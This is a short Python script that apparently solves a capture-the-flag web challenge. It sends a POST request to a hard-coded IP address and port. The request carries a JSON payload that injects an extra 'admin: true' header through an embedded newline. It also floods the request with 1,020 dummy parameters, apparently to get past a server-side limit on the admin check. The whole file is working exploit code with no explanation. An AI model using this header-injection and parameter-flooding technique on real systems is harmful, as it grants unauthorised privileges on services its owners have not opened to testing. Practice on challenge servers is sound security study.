import requests
import json

url = "http://61.147.171.103:52948/"
datas = {"headers": ["xx:xx\nadmin: true", "Content-Type: application/json"],"params": {"admin": "true"}}

for i in range(1020):
    datas["params"]["x"+str(i)] = i

headers = {"Content-Type": "application/json"}

json1 = json.dumps(datas)

print(json1)
res = requests.post(url,headers= headers,data= json1)
print(res.content)